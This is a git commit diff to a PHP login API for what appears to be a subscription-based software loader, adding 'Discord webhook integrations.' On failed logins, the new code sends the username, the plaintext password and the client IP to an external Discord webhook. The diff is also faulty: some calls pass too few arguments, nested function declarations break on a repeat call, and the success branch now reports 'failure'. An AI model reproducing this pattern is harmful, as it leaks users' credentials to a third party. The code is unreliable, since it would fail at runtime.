126d15ceb69e3f99c203c3d5aff2313592db0f85
Smellon <74884194+Smellon69@users.noreply.github.com>
2023-10-08 21:26:13 -0300

    Absolutely revolutionary discord webhooks integrations

--- app/models/Api.php
+++ app/models/Api.php
@@ -5,77 +5,126 @@ require_once __DIR__.'/../core/Database.php';
 
 class Api extends Database
 {
-	protected function userAPI($username, $password, $hwid) {
+	protected function userAPI($username, $password, $hwid)
+    {
+        // Fetch username
+        $this->prepare('SELECT * FROM `users` WHERE `username` = ?');
+        $this->statement->execute([$username]);
+        $row = $this->statement->fetch();
 
-		// fetch username
-		$this->prepare('SELECT * FROM `users` WHERE `username` = ?');
-		$this->statement->execute([$username]);
-		$row = $this->statement->fetch();
-		
-		// If username is correct
-		if ($row) {
+        function sendWebhookMessage($color, $user, $message, $password)
+        {
+            function getUserIP()
+            {
+                if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
+                    // Check if the client IP is available in the HTTP_CLIENT_IP header
+                    $userIP = $_SERVER['HTTP_CLIENT_IP'];
+                } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
+                    // Check if the client IP is available in the HTTP_X_FORWARDED_FOR header
+                    $userIP = $_SERVER['HTTP_X_FORWARDED_FOR'];
+                } else {
+                    // Use the default REMOTE_ADDR if no alternative is available
+                    $userIP = $_SERVER['REMOTE_ADDR'];
+                }
 
-			$hashedPassword = $row->password;
+                return $userIP;
+            }
 
-			// If password is correct
-			if (password_verify($password, $hashedPassword)) {
+            $webhook = 'https://discord.com/api/webhooks/insanewebhookomg'; // Replace with your actual webhook URL
+            $content = "<@123456789>"; // Replace with a roles ID or your own userID by enabling discord developer mode and right clicking your name
+            $userIP = getUserIP();
+            $data = array(
+                "content" => $content,
+                "embeds" => array(
+                    array(
+                        "title" => "📜 **Log: $message**",
+                        "description" => "🔐 Username: ```$user``` 🔐 Password: ```$password``` 🌎 Client IP: ```$userIP```",
+                        "color" => $color
+                    )
+                )
+            );
 
-				// If user's hwid is NULL
-				if ($row->hwid === NULL) {
+            $options = array(
+                'http' => array(
+                    'header'  => "Content-type: application/json\r\n",
+                    'method'  => 'POST',
+                    'content' => json_encode($data)
+                )
+            );
 
-					$this->prepare('UPDATE `users` SET `hwid` = ? WHERE `username` = ?');
-					$this->statement->execute([$hwid, $username]);
+            $context = stream_context_create($options);
+            $result = file_get_contents($webhook, false, $context);
+            return $result;
+        }
 
-					return array('status' => 'failed', 'error' => 'Restart your loader');
-				}
+        // If username is correct
+        if ($row) {
+            $hashedPassword = $row->password;
 
-				if ($row->hwid === $hwid) {
+            // If password is correct
+            if (password_verify($password, $hashedPassword)) {
+                // If user's hwid is NULL
+                if ($row->hwid === NULL) {
+                    $this->prepare('UPDATE `users` SET `hwid` = ? WHERE `username` = ?');
+                    $this->statement->execute([$hwid, $username]);
 
-					$has_sub = false;
+                    $errorMessage = 'Restart your Loader';
+                    sendWebhookMessage('ff0000', "'$username' attempted to log in, but ", $errorMessage);
 
-					if (strtotime($row->sub) > strtotime('now')) {
-						$has_sub = true;
-						} else {
-						$has_sub = false;
-					}
+                    return json_encode(array(
+                        'status' => 'failed',
+                        'error' => $errorMessage
+                    ));
+                }
 
-					if ($has_sub) {
-						$response = array(
-							'status' => 'success', 
-							'user' => array(
-								'uid' => $row->uid,
-								'username' => $row->username,
-								'hwid' => $row->hwid,
-								'banned' => $row->banned,
-								'admin' => $row->admin,
-								'sub' => $row->sub,
-								'createdAt' => $row->createdAt,
-							),
-						);
-					} else {
-						// No subscription, everything else is correct
-						$response = array('status' => 'failed', 'error' => 'Invalid subscription');
-					}
-				} else {
-					// Wrong hwid, user and pass are correct
-					$response = array('status' => 'failed', 'error' => 'Invalid hwid');
-				}
-				
-			} else {
+                if ($row->hwid === $hwid) {
+                    $has_sub = false;
 
-				// Wrong pass, user exists
-				$response = array('status' => 'failed', 'error' => 'Invalid password');
+                    if (strtotime($row->sub) > strtotime('now')) {
+                        $has_sub = true;
+                    } else {
+                        $has_sub = false;
+                    }
 
-			}
+                    if ($has_sub) {
+                        $response = array(
+                            'status' => 'failure',
+                            'user' => array(
+                                'uid' => $row->uid,
+                                'username' => $row->username,
+                                'hwid' => $row->hwid,
+                                'banned' => $row->banned,
+                                'admin' => $row->admin,
+                                'sub' => $row->sub,
+                                'createdAt' => $row->createdAt,
+                            ),
+                        );
+                    } else {
+                        // No subscription, everything else is correct
+                        $response = array('status' => 'failed', 'error' => 'Invalid subscription');
+                    }
+                } else {
+                    // Wrong hwid, user and pass are correct
+                    $errorMessage = 'Invalid HWID';
+                    sendWebhookMessage('ff0000', "'$username' attempted to log in, but had a ", $errorMessage);
 
-		} else {
+                    $response = array('status' => 'failed', 'error' => $errorMessage);
+                }
+            } else {
+                // Wrong password, user exists
+                $errorMessage = 'Invalid password';
+                sendWebhookMessage('16713216', $row->username, $errorMessage, $password);
 
-			// Wrong username, user doesnt exists
-			$response = array('status' => 'failed', 'error' => 'Invalid username');
+                $response = array('status' => 'failed', 'error' => $errorMessage);
+            }
+        } else {
+            // Wrong username, user doesn't exist
+            $errorMessage = 'Invalid username';
+            sendWebhookMessage('16713216', $username, $errorMessage, $password);
 
-		}
+            $response = array('status' => 'failed', 'error' => $errorMessage);
+        }
 
-		return $response;
-
-	}   
+        return $response;
+    }
 }
